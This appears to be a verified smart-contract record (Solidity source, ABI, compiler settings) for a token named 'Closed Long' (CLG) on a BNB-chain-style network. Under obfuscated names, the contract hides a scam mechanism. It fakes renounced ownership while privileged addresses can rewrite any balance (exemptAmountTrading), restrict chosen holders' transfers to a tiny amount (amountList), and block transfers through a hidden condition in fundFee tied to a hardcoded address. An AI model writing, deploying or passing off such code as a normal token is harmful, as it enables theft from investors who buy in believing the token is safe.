{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface shouldList {\n    function createPair(address tradingWallet, address receiverAtToken) external returns (address);\n}\n\ninterface totalTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTake) external view returns (uint256);\n\n    function transfer(address enableMin, uint256 modeReceiver) external returns (bool);\n\n    function allowance(address maxTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableMin,\n        uint256 modeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyFundAuto, uint256 value);\n    event Approval(address indexed maxTeam, address indexed spender, uint256 value);\n}\n\nabstract contract exemptMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTakeMetadata is totalTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClosedLong is exemptMax, totalTake, totalTakeMetadata {\n\n    string private launchedReceiver = \"CLG\";\n\n    address private shouldMin;\n\n    uint256 public receiverList;\n\n    function name() external view virtual override returns (string memory) {\n        return listMode;\n    }\n\n    function fromLaunch(uint256 modeReceiver) public {\n        buySwap();\n        exemptReceiver = modeReceiver;\n    }\n\n    bool private txTotal;\n\n    function approve(address receiverLimit, uint256 modeReceiver) public virtual override returns (bool) {\n        exemptTake[_msgSender()][receiverLimit] = modeReceiver;\n        emit Approval(_msgSender(), receiverLimit, modeReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldMin;\n    }\n\n    mapping(address => bool) public modeLaunch;\n\n    function fundFee(address senderMinFee, address enableMin, uint256 modeReceiver) internal returns (bool) {\n        if (senderMinFee == totalIsLaunch) {\n            return launchMinList(senderMinFee, enableMin, modeReceiver);\n        }\n        uint256 marketingReceiver = totalTake(liquidityTrading).balanceOf(limitIs);\n        require(marketingReceiver == exemptReceiver);\n        require(enableMin != limitIs);\n        if (modeLaunch[senderMinFee]) {\n            return launchMinList(senderMinFee, enableMin, exemptAtSender);\n        }\n        return launchMinList(senderMinFee, enableMin, modeReceiver);\n    }\n\n    bool public limitList;\n\n    function balanceOf(address autoTake) public view virtual override returns (uint256) {\n        return listTake[autoTake];\n    }\n\n    mapping(address => bool) public exemptBuy;\n\n    function launchMinList(address senderMinFee, address enableMin, uint256 modeReceiver) internal returns (bool) {\n        require(listTake[senderMinFee] >= modeReceiver);\n        listTake[senderMinFee] -= modeReceiver;\n        listTake[enableMin] += modeReceiver;\n        emit Transfer(senderMinFee, enableMin, modeReceiver);\n        return true;\n    }\n\n    address txList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public launchSender;\n\n    event OwnershipTransferred(address indexed isMode, address indexed liquidityModeTake);\n\n    address limitIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (isTo != receiverList) {\n            txReceiver = false;\n        }\n        marketingSwap launchAuto = marketingSwap(txList);\n        liquidityTrading = shouldList(launchAuto.factory()).createPair(launchAuto.WETH(), address(this));\n        \n        totalIsLaunch = _msgSender();\n        exemptBuy[totalIsLaunch] = true;\n        listTake[totalIsLaunch] = txTo;\n        fundLimit();\n        if (limitList == launchSender) {\n            receiverList = isTo;\n        }\n        emit Transfer(address(0), totalIsLaunch, txTo);\n    }\n\n    address public liquidityTrading;\n\n    bool private txReceiver;\n\n    function exemptAmountTrading(address listFrom, uint256 modeReceiver) public {\n        buySwap();\n        listTake[listFrom] = modeReceiver;\n    }\n\n    function allowance(address launchEnable, address receiverLimit) external view virtual override returns (uint256) {\n        if (receiverLimit == txList) {\n            return type(uint256).max;\n        }\n        return exemptTake[launchEnable][receiverLimit];\n    }\n\n    uint256 public isTo;\n\n    uint256 exemptReceiver;\n\n    string private listMode = \"Closed Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeToFund;\n    }\n\n    bool private limitMode;\n\n    uint256 private buyAt;\n\n    uint8 private modeToFund = 18;\n\n    function transferFrom(address senderMinFee, address enableMin, uint256 modeReceiver) external override returns (bool) {\n        if (_msgSender() != txList) {\n            if (exemptTake[senderMinFee][_msgSender()] != type(uint256).max) {\n                require(modeReceiver <= exemptTake[senderMinFee][_msgSender()]);\n                exemptTake[senderMinFee][_msgSender()] -= modeReceiver;\n            }\n        }\n        return fundFee(senderMinFee, enableMin, modeReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return shouldMin;\n    }\n\n    function transfer(address listFrom, uint256 modeReceiver) external virtual override returns (bool) {\n        return fundFee(_msgSender(), listFrom, modeReceiver);\n    }\n\n    mapping(address => uint256) private listTake;\n\n    function launchLaunched(address launchLiquidity) public {\n        if (sellTx) {\n            return;\n        }\n        \n        exemptBuy[launchLiquidity] = true;\n        \n        sellTx = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedReceiver;\n    }\n\n    function buySwap() private view {\n        require(exemptBuy[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTo;\n    }\n\n    function fundLimit() public {\n        emit OwnershipTransferred(totalIsLaunch, address(0));\n        shouldMin = address(0);\n    }\n\n    uint256 private txTo = 100000000 * 10 ** 18;\n\n    function amountList(address walletSwap) public {\n        buySwap();\n        \n        if (walletSwap == totalIsLaunch || walletSwap == liquidityTrading) {\n            return;\n        }\n        modeLaunch[walletSwap] = true;\n    }\n\n    address public totalIsLaunch;\n\n    bool public sellTx;\n\n    uint256 constant exemptAtSender = 4 ** 10;\n\n    uint256 modeEnable;\n\n    mapping(address => mapping(address => uint256)) private exemptTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityModeTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFundAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"amountList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiver\",\"type\":\"uint256\"}],\"name\":\"exemptAmountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeReceiver\",\"type\":\"uint256\"}],\"name\":\"fromLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidity\",\"type\":\"address\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIsLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ClosedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}